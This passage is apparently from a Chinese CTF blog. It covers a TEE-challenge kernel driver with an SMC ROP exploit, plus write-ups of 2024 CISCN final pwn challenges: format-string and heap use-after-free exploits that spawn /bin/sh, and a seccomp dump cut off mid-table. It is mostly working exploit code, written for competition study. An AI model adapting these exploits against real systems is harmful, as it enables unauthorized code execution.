<span class="hljs-keyword">if</span>( copy_to_user((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)arb_read_arg.recv_addr, ptr,arb_read_arg.size) )<br>                        &#123;<br>                                pr_err(<span class="hljs-string">&quot;Data Read : Err!\n&quot;</span>);<br>                                <span class="hljs-keyword">return</span> <span class="hljs-number">-3</span>;<br>                        &#125;<br><br>                        <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                        pr_info(<span class="hljs-string">&quot;Default\n&quot;</span>);<br>                        <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br> <br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** Module Init function</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">etx_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        <span class="hljs-comment">/*Allocating Major number*/</span><br>        <span class="hljs-keyword">if</span>((alloc_chrdev_region(&amp;dev, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;etx_Dev&quot;</span>)) &lt;<span class="hljs-number">0</span>)&#123;<br>                pr_err(<span class="hljs-string">&quot;Cannot allocate major number\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        pr_info(<span class="hljs-string">&quot;Major = %d Minor = %d \n&quot;</span>,MAJOR(dev), MINOR(dev));<br> <br>        <span class="hljs-comment">/*Creating cdev structure*/</span><br>        cdev_init(&amp;etx_cdev,&amp;fops);<br> <br>        <span class="hljs-comment">/*Adding character device to the system*/</span><br>        <span class="hljs-keyword">if</span>((cdev_add(&amp;etx_cdev,dev,<span class="hljs-number">1</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>            pr_err(<span class="hljs-string">&quot;Cannot add the device to the system\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> r_class;<br>        &#125;<br> <br>        <span class="hljs-comment">/*Creating struct class*/</span><br>        <span class="hljs-keyword">if</span>(IS_ERR(dev_class = class_create(<span class="hljs-string">&quot;etx_class&quot;</span>)))&#123;<br>            pr_err(<span class="hljs-string">&quot;Cannot create the struct class\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> r_class;<br>        &#125;<br> <br>        <span class="hljs-comment">/*Creating device*/</span><br>        <span class="hljs-keyword">if</span>(IS_ERR(device_create(dev_class,<span class="hljs-literal">NULL</span>,dev,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&quot;etx_device&quot;</span>)))&#123;<br>            pr_err(<span class="hljs-string">&quot;Cannot create the Device 1\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> r_device;<br>        &#125;<br>        pr_info(<span class="hljs-string">&quot;Device Driver Insert...Done!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>r_device:<br>        class_destroy(dev_class);<br>r_class:<br>        unregister_chrdev_region(dev,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** Module exit function</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">etx_driver_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        device_destroy(dev_class,dev);<br>        class_destroy(dev_class);<br>        cdev_del(&amp;etx_cdev);<br>        unregister_chrdev_region(dev, <span class="hljs-number">1</span>);<br>        pr_info(<span class="hljs-string">&quot;Device Driver Remove...Done!!!\n&quot;</span>);<br>&#125;<br> <br>module_init(etx_driver_init);<br>module_exit(etx_driver_exit);<br> <br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;EmbeTronicX &lt;embetronicx@gmail.com&gt;&quot;</span>);<br>MODULE_DESCRIPTION(<span class="hljs-string">&quot;Simple Linux device driver (IOCTL)&quot;</span>);<br>MODULE_VERSION(<span class="hljs-string">&quot;1.5&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DRIVER_PATH <span class="hljs-string">&quot;/dev/etx_device&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_SMC 0x13370001</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> smc_fid;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x1;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x3;<br>&#125; SmcArgs;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> devfd = open(DRIVER_PATH, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> status = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> phys_addr = <span class="hljs-number">0x423DF000</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size = <span class="hljs-number">0x2000</span>;<br>    <span class="hljs-type">size_t</span> *ptr = mmap(<span class="hljs-literal">NULL</span>, size, PROT_READ|PROT_WRITE, <br>                    MAP_SHARED, devfd, phys_addr);<br><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++) &#123;<br>        ptr[i] = <span class="hljs-number">0xdeadbeef</span> + i;<br>    &#125;<br><br>    <span class="hljs-comment">// 0x000000000e0a01d4: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;</span><br>    <span class="hljs-comment">// 0x000000000e0a1e6c: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;</span><br><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;   <span class="hljs-comment">// 0x00</span><br>    ptr[i++] = <span class="hljs-number">0xe0a1e6c</span>;   <span class="hljs-comment">// 0x08</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x10</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x18</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x20</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x28</span><br><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x00</span><br>    ptr[i++] = <span class="hljs-number">0xe0a01d4</span>;   <span class="hljs-comment">// 0x08</span><br>    ptr[i++] = <span class="hljs-number">0xe0d735c</span>;   <span class="hljs-comment">// 0x10 flag</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x18</span><br><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x00</span><br>    ptr[i++] = <span class="hljs-number">0xe0a25ac</span>;   <span class="hljs-comment">// 0x08 getflag</span><br>    ptr[i++] = <span class="hljs-number">0xdeadbeef</span>;  <span class="hljs-comment">// 0x10</span><br>    ptr[i++] = <span class="hljs-number">0xe0a1a7c</span>;   <span class="hljs-comment">// 0x18</span><br><br>    SmcArgs smc_arg = &#123;<span class="hljs-number">0xc3000000</span>, <span class="hljs-number">0x423DF000</span>, <span class="hljs-number">8</span>*i, <span class="hljs-number">0</span>&#125;;<br>    status = ioctl(devfd, CMD_SMC, &amp;smc_arg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>tee</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 CISCN决赛 pwn wp</title>
    <link href="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/"/>
    <url>/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/</url>
    
    <content type="html"><![CDATA[<p>o4赢！可惜没有排行榜截图QAQ</p><p>awdp web和pwn都没打好但可信上大分的一集</p><span id="more"></span><h1 id="anime"><a href="#anime" class="headerlink" title="anime"></a>anime</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>格式化字符串，思路“隔山打牛”</p><h2 id="一些自我反省：）"><a href="#一些自我反省：）" class="headerlink" title="一些自我反省：）"></a>一些自我反省：）</h2><p><em>这题比赛的时候就出了，写在这里只是为了自我反省一下（</em></p><p>某次比赛的时候做过这种思路的题，一时没想起来，感觉我需要本地搭个知识库之类的东西…记忆力太差了，很简单的一道题耗时太多，后面没时间了不然感觉ezheap也能出</p><p>另外最近思维有点僵，状态有点类似刚升高三的时候，corCTF也是一个格式化字符串，思路正确转个弯就有一个更快的方法，硬是没想到，Tplus说的时候我快气死了……我怎么可以想不到，之前RW的时候也有类似的情况</p><p>评价是最近还是脑子动少了，<del>写前端写的</del></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">from</span> aeslc <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getstr</span>(<span class="hljs-params">content</span>):<br>    key=<span class="hljs-string">b&#x27;\x7b\xf3\x5c\xd6\x9c\x47\x5d\x5e\x6f\x1d\x7a\x23\x18\x7b\xf9\x34&#x27;</span><br>    aes=AES(key=key)<br>    enc=content<br>    dec=aes.AES_encrypt(<span class="hljs-string">&quot;AES_ECB&quot;</span>,enc)<br>    <span class="hljs-keyword">return</span> dec<br><br>p=remote(<span class="hljs-string">&#x27;39.106.48.123&#x27;</span>,<span class="hljs-number">26563</span>)<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment">#payload=b&#x27;a&#x27;*8+b&#x27;\x60\x80&#x27;</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;linsir want to know your name\n&#x27;</span>,payload)<br>p.sendafter(<span class="hljs-string">b&#x27;what\&#x27;s your favourite anime: &#x27;</span>,getstr(<span class="hljs-string">b&#x27;%15$p%17$p%11$p\xff&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libcbase=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)[:-<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x24083</span><br>stack=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)[:-<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)<br>pie=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\xff&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x11e0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pie))<br>payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((stack-<span class="hljs-number">0x124</span>)&amp;<span class="hljs-number">0xffff</span>).encode()+<span class="hljs-string">b&#x27;c&#x27;</span>+<span class="hljs-string">b&#x27;%6$hn&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;anime: &#x27;</span>,getstr(payload))<br>payload=<span class="hljs-string">b&#x27;%30c%45$hhn&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;anime: &#x27;</span>,getstr(payload))<br><span class="hljs-comment">#payload=b&#x27;%&#x27;+str((stack-0x118)&amp;0xffff).encode()+b&#x27;c&#x27;+b&#x27;%6hn&#x27;</span><br><span class="hljs-comment">#p.sendafter(b&#x27;anime: &#x27;,getstr(payload))</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hack</span>(<span class="hljs-params">addr,value</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((addr+i*<span class="hljs-number">2</span>)&amp;<span class="hljs-number">0xffff</span>).encode()+<span class="hljs-string">b&#x27;c&#x27;</span>+<span class="hljs-string">b&#x27;%6$hn&#x27;</span><br>        p.sendafter(<span class="hljs-string">b&#x27;anime: &#x27;</span>,getstr(payload))<br>        payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>((value&gt;&gt;(<span class="hljs-number">16</span>*i))&amp;<span class="hljs-number">0xffff</span>).encode()+<span class="hljs-string">b&#x27;c&#x27;</span>+<span class="hljs-string">b&#x27;%45$hn&#x27;</span><br>        p.sendafter(<span class="hljs-string">b&#x27;anime: &#x27;</span>,getstr(payload))<br><br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libcbase<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>binsh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>ret=libcbase+<span class="hljs-number">0x0000000000022679</span><br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>hack(stack-<span class="hljs-number">0xf0</span>,ret)<br>hack(stack-<span class="hljs-number">0xf0</span>+<span class="hljs-number">8</span>,rdi)<br>hack(stack-<span class="hljs-number">0xf0</span>+<span class="hljs-number">0x10</span>,binsh)<br>hack(stack-<span class="hljs-number">0xf0</span>+<span class="hljs-number">0x18</span>,system)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ul><li><p><strong>漏洞点</strong>：一个uaf，一个overflow</p><p><em>做着做着忘了有个overflow，再次佐证wjy最近脑子不好使</em></p></li><li><p><strong>交互</strong>：有序列化，需要逆一下，赛时觉得时间不够了，靠re手逆了一些后直接开猜，半逆半猜也是把交互问题解决了</p><ul><li>有一个比较难搞的问题就是不可见字符，7f以下用unicode，7f以上直接\x就行，<em>这也是试出来的</em></li></ul></li><li><p><strong>一些问题</strong>：因为序列化堆非常乱，<em>赛时卡泄漏卡到最后，赛后没多久也出了，但堆布局卡的很死，不知道远程会不会有问题</em></p></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getpack</span>():<br>    pack=<span class="hljs-string">b&#x27;\xef\xbb\xbf&#x27;</span><br>    <span class="hljs-keyword">return</span> pack<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getmethod</span>(<span class="hljs-params">choice,idx,size,mess</span>):<br>    payload=<span class="hljs-string">b&#x27;&#123;&#x27;</span><br>    payload+=<span class="hljs-string">b&#x27;&quot;choice&quot;:&#x27;</span>+choice+<span class="hljs-string">b&#x27;,&#x27;</span><br>    payload+=<span class="hljs-string">b&#x27;&quot;index&quot;:&#x27;</span>+<span class="hljs-built_in">str</span>(idx).encode()+<span class="hljs-string">b&#x27;,&#x27;</span><br>    payload+=<span class="hljs-string">b&#x27;&quot;length&quot;:&#x27;</span>+<span class="hljs-built_in">str</span>(size).encode()+<span class="hljs-string">b&#x27;,&#x27;</span><br>    payload+=<span class="hljs-string">b&#x27;&quot;message&quot;:&quot;&#x27;</span>+mess+<span class="hljs-string">b&#x27;&quot;&#125;&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,mess</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input:&#x27;</span>,getmethod(<span class="hljs-string">b&#x27;&quot;new&quot;&#x27;</span>,<span class="hljs-number">0</span>,size,mess))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input:&#x27;</span>,getmethod(<span class="hljs-string">b&#x27;&quot;rm&quot;&#x27;</span>,idx,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input:&#x27;</span>,getmethod(<span class="hljs-string">b&#x27;&quot;view&quot;&#x27;</span>,idx,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input:&#x27;</span>,getmethod(<span class="hljs-string">b&#x27;&quot;modify&quot;&#x27;</span>,idx,size,content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deal</span>(<span class="hljs-params">content</span>):<br>    var=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> content:<br>        <span class="hljs-keyword">if</span> num&gt;=<span class="hljs-number">0x80</span>:<br>            var+=num.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            var+=<span class="hljs-string">b&#x27;\\u00&#x27;</span>+<span class="hljs-built_in">hex</span>(num)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>).encode()<br>    <span class="hljs-keyword">return</span> var<br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)    <span class="hljs-comment">#0</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>off0=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;bbb&#x27;</span>)    <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x1e0</span>+<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;ccc&#x27;</span>)    <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;ddd&#x27;</span>)    <span class="hljs-comment">#3</span><br>off1=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;message:&#x27;</span>)<br>heap=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-(off0&amp;<span class="hljs-number">0xfff</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>payload=<span class="hljs-string">b&#x27;\\u0000&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">b&#x27;\\u0051\\u0002&#x27;</span>+<span class="hljs-string">b&#x27;\\u0000&#x27;</span>*(<span class="hljs-number">6</span>+<span class="hljs-number">0x240</span>+<span class="hljs-number">8</span>)+<span class="hljs-string">b&#x27;\\u0021\\u000e&#x27;</span>+<span class="hljs-string">b&#x27;\\u0000&#x27;</span>*<span class="hljs-number">6</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>+<span class="hljs-number">0x250</span>,payload)<br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;message:&#x27;</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x1ecbe0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,deal(p64(libcbase+<span class="hljs-number">0x1eee48</span>)))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;/bin/sh\\u0000&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,deal(p64(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])))<br>delete(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="CHR"><a href="#CHR" class="headerlink" title="CHR"></a>CHR</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><ul><li><p>这次国赛的主题就是混乱的堆：）</p><img src="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/bins.png" class title="bins"></li><li><p>开了沙箱，黑名单，直接orw就行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./pwn</span><br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x1e 0xc000003e  if (A != ARCH_X86_64) goto 0032<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005<br> 0004: 0x15 0x00 0x1b 0xffffffff  if (A != 0xffffffff) goto 0032<br> 0005: 0x15 0x1a 0x00 0x00000038  if (A == clone) goto 0032<br> 0006: 0x15 0x19 0x00 0x00000039  if (A == fork) goto 0032<br> 0007: 0x15 0x18 0x00 0x0000003a  if (A == vfork) goto 